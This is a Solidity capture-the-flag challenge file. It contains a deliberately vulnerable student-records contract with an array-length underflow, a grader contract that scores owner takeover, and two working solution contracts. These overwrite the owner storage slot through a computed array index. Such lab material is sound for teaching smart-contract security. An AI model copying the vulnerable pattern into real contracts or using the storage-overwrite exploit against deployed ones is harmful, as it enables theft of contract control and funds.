// SPDX-License-Identifier: MIT

// 这是学校管理学生信息的一个合约，但...貌似有一个漏洞，尝试去获取owner权限吧！
pragma solidity 0.4.24;

contract StudentInfo {
    address public owner;//0
    uint[] public students_Id;//1
    uint256 public flag;//2
    struct Student{
        string name;
        uint8 old;
        uint8 grade;
    }
    mapping(uint256 => Student) students;//3
    uint256 public score;

    constructor () public {

    }

    function reduce(uint256 index) public {
        if(students_Id.length > 0){
            uint256 id = students_Id[index];
            delete students[id];
            //swap
            uint temp = students_Id[students_Id.length - 1];
            students_Id[students_Id.length - 1] = id;
            students_Id[index] = temp;
        }
        students_Id.length--;
    }

    function increase(string name, uint8 old, uint8 grade) public {
        students_Id.length++;
        uint256 id = students_Id[students_Id.length - 1];
        students[id] = Student(name, old, grade);
    }

    function revise(uint i, uint256 _content) public {
        students_Id[i] = _content;
    }
    
    function getLength() public returns(uint256) {
        return students_Id.length;
    }
    
}

contract attract{
    Check che;
    StudentInfo info;
    constructor(address addr) public {
        che = Check(addr);
        info = che.stu();
    }

    function att() public {
        info.reduce(0);
        info.revise(getIndex(), uint256(address(this)));
    }
    function getscore() public {
        che.isComplete();
    }
    // 解题遇到问题abi.encodePacked时输出的数据类型会对打包结果有影响
    function getIndex() public pure returns(uint256 Index){
        Index = (2 ** 256 - 1 - uint256(keccak256(abi.encodePacked(uint256(1))))) + 1;
    }
    function getIndex1() public pure returns(uint256 Index){
        Index = (2 ** 256 - 1 - uint256(keccak256(abi.encodePacked((1))))) + 1;
    }
    function getabi() public pure returns(uint256 Index){
        Index = uint256(bytes32(abi.encodePacked(1))) ;
    }


}

contract Check {
    StudentInfo public stu;
    uint256 public score;
    constructor() public {
        stu = new StudentInfo();
    }

    function isComplete() public {
        score = 0;
        if(isContract(msg.sender) == true){
            score = 25;
        }
        if(stu.getLength() > 10000000000000000000000000){
            score = 50;
        }
        if(stu.owner() == msg.sender){
            score = 100;
        }
    }

    //检查是否为合约调用
    function isContract(address addr) private view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract att{
    Check che;
    StudentInfo st;
    constructor(address addr) public  {
        che = Check(addr);
        st = che.stu();
    }
    function attrack() public {
        st.reduce(0);
        st.revise(getindex(1), uint256(address(this)));
        che.isComplete();
    }
    function getindex(uint256 solt) public pure returns(uint256){
        uint256 a = uint256(keccak256(abi.encodePacked(solt)));
        uint256 b = 2**256 - 1;
        return b - a + 1;
    }

}